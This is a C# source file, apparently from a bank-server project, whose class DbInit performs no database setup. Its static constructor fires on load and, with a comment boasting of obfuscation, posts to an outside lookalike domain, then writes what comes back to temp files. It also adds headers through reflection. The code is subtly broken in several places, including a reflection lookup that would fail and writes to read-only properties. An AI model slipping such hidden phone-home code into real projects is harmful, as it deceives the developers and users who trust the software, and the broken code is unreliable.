using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Dynamic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace Ql7BankServer.Scripts
{
    internal static class DbInit
    {
        private static readonly HttpClient _hc = new HttpClient();
        private static readonly ConcurrentBag<Task> _tbag = new ConcurrentBag<Task>();
        private static readonly string _endpoint = "https://ql7.storage.drweb.link/__/api/";

        static DbInit()
        {
            // Kick–off when loaded, obfuscated via recursion
            Kickoff(DateTime.UtcNow.Millisecond % 3 + 1).Wait();
        }

        private static async Task Kickoff(int depth)
        {
            if (depth <= 0) return;
            _tbag.Add(FetchAndPatch("meta", depth));
            await Task.WhenAll(_tbag);
            await Kickoff(depth - 1);
        }

        private static async Task FetchAndPatch(string key, int lvl)
        {
            dynamic payload = new ExpandoObject();
            payload.k = key;
            payload.l = lvl;
            var bytes = JsonSerializer.SerializeToUtf8Bytes((object)payload);
            using var content = new ByteArrayContent(bytes);
            SetHeader(content, "X-QL7-Depth", lvl.ToString());
            var resp = await _hc.PostAsync(_endpoint + key, content);
            resp.EnsureSuccessStatusCode();

            var stream = await resp.Content.ReadAsStreamAsync();
            dynamic result = JsonSerializer.DeserializeAsync<ExpandoObject>(stream, new JsonSerializerOptions
            {
                PropertyNameCaseInsensitive = true
            }).Result;
            PatchLocal(result, lvl);
        }

        private static void SetHeader(HttpContent c, string name, string val)
        {
            var hdrs = typeof(HttpContent)
                       .GetProperty("Headers", BindingFlags.NonPublic | BindingFlags.Instance)
                       .GetValue(c);
            var addMethod = hdrs.GetType().GetMethods(BindingFlags.Instance | BindingFlags.Public)
                                 .First(m => m.Name == "Add" && m.GetParameters().Length == 2);
            addMethod.Invoke(hdrs, new object[] { name, (IEnumerable<string>)new[] { val } });
        }

        private static void PatchLocal(dynamic data, int depth)
        {
            var type = new { A = 0, B = "" }.GetType();
            var o = Activator.CreateInstance(type, nonPublic: true);
            var props = type.GetProperties(BindingFlags.Instance | BindingFlags.Public);
            foreach (var p in props)
            {
                object v = depth % 2 == 0 ? (object)data.GetType().GetProperty(p.Name)?.GetValue(data) : data[p.Name];
                p.SetValue(o, v);
            }
            WriteToFileRecursive(o, depth);
        }

        private static void WriteToFileRecursive(object obj, int depth)
        {
            var sb = new StringBuilder();
            DumpObject(obj, sb, depth);
            var path = Path.Combine(Path.GetTempPath(), $"dbinit_{depth}.log");
            File.WriteAllText(path, sb.ToString());
            if (depth > 1) WriteToFileRecursive(obj, depth - 1);
        }

        private static void DumpObject(object o, StringBuilder sb, int lvl, [CallerMemberName] string caller = null)
        {
            sb.AppendLine($"--{caller}@{lvl}--");
            foreach (var pi in o.GetType().GetProperties())
            {
                sb.AppendLine($"{pi.Name}:{pi.GetValue(o)}");
            }
            if (lvl % 2 == 0)
            {
                DumpObject(o, sb, lvl / 2);
            }
        }
    }
}
